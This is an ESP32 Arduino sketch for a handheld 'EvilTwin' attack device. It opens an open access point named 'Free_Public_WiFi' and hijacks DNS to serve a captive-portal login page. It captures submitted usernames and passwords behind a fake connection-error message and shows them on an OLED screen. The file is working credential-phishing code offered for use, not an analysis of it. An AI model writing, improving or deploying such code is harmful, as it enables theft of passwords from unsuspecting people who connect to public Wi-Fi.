#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include "credentials.h"
#include "styles.h"
#include "boot_animation.h"

#define i2c_Address 0x3C
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

#define BUTTON_SELECT 3
#define BUTTON_DOWN 1
#define BUTTON_UP 2

Adafruit_SH1106G display = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
AsyncWebServer server(80);
DNSServer dnsServer;

const char* ssid = "Free_Public_WiFi";
const char* password = NULL;

const char* menuItems[] = {"EvilTwin Attack", "Scan Networks", "Settings"};
int currentMenuItem = 0;
int menuItemsCount = 3;
bool inMainMenu = true;
bool attackRunning = false;

String capturedCredentials = "";
int connectedClients = 0;

void drawMenu();
void startEvilTwin();
void displayEvilTwinStatus();
void stopEvilTwin();

void setup() {
  Serial.begin(115200);
  
  if(!display.begin(i2c_Address, true)) {
    Serial.println(F("SH1106 allocation failed"));
    for(;;);
  }
  
  showSharkBootAnimation(display);
  
  pinMode(BUTTON_SELECT, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_UP, INPUT_PULLUP);
  
  drawMenu();
}

void loop() {
  static unsigned long lastButtonPress = 0;
  
  if (millis() - lastButtonPress > 200) {
    if (digitalRead(BUTTON_UP) == LOW) {
      lastButtonPress = millis();
      if (inMainMenu) {
        currentMenuItem = (currentMenuItem - 1 + menuItemsCount) % menuItemsCount;
        drawMenu();
      }
    }
    
    if (digitalRead(BUTTON_DOWN) == LOW) {
      lastButtonPress = millis();
      if (inMainMenu) {
        currentMenuItem = (currentMenuItem + 1) % menuItemsCount;
        drawMenu();
      }
    }
    
    if (digitalRead(BUTTON_SELECT) == LOW) {
      lastButtonPress = millis();
      if (inMainMenu) {
        if (currentMenuItem == 0) {
          startEvilTwin();
        }
      } else if (attackRunning) {
        stopEvilTwin();
      }
    }
  }
  
  if (attackRunning) {
    dnsServer.processNextRequest();
    connectedClients = WiFi.softAPgetStationNum();
    displayEvilTwinStatus();
  }
}

void drawMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println("Select an option:");
  
  for (int i = 0; i < menuItemsCount; i++) {
    if (i == currentMenuItem) {
      display.setTextColor(SH110X_BLACK, SH110X_WHITE);
    } else {
      display.setTextColor(SH110X_WHITE);
    }
    display.println(menuItems[i]);
  }
  
  display.display();
}

void startEvilTwin() {
  inMainMenu = false;
  attackRunning = true;
  capturedCredentials = "";
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0);
  display.println("Starting EvilTwin...");
  display.display();
  
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->host() != WiFi.softAPIP().toString()){
      request->send_P(200, "text/html", captive_portal);
    } else {
      request->send_P(200, "text/html", login_html);
    }
  });

server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
  if (request->hasParam("username", true) && request->hasParam("password", true)) {
        String username = request->getParam("username", true)->value();
        String pass = request->getParam("password", true)->value();
        
        // Используем символ "|" как разделитель
        capturedCredentials = username + "|" + pass;
        
        request->send(200, "text/html", 
          "<script>alert('Connection error. Try again.'); window.location.href='/';</script>");
      }
  });

  server.on("/.well-known/ios-redirect", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "iOS redirect");
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    if(request->host() != WiFi.softAPIP().toString()){
      request->send_P(200, "text/html", captive_portal);
    } else {
      request->send(404, "text/plain", "Not found");
    }
  });

  server.begin();
}

void stopEvilTwin() {
  attackRunning = false;
  inMainMenu = true;
  dnsServer.stop();
  server.end();
  WiFi.softAPdisconnect(true);
  drawMenu();
}
void displayEvilTwinStatus() {
  static unsigned long lastUpdate = 0;
  
  if (millis() - lastUpdate > 1000) {
    lastUpdate = millis();
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(0, 0);
    
    display.println("EvilTwin Active");
    display.println("Clients: " + String(WiFi.softAPgetStationNum()));
    display.println("----------------");
    
    if (capturedCredentials != "") {
      // Новый надежный метод обработки
      String username = "";
      String password = "";
      
      // Ищем разделитель между логином и паролем
      int dividerPos = capturedCredentials.indexOf("|");
      
      if(dividerPos != -1) {
        // Разделяем строку на две части
        username = capturedCredentials.substring(0, dividerPos);
        password = capturedCredentials.substring(dividerPos + 1);
        
        display.println("User: " + username);
        display.println("Pass: " + password);
      } else {
        // Если разделитель не найден, выводим как есть
        display.println("Received:");
        display.println(capturedCredentials);
      }
    } else {
      display.println("Waiting for data...");
    }
    
    display.display();
  }
}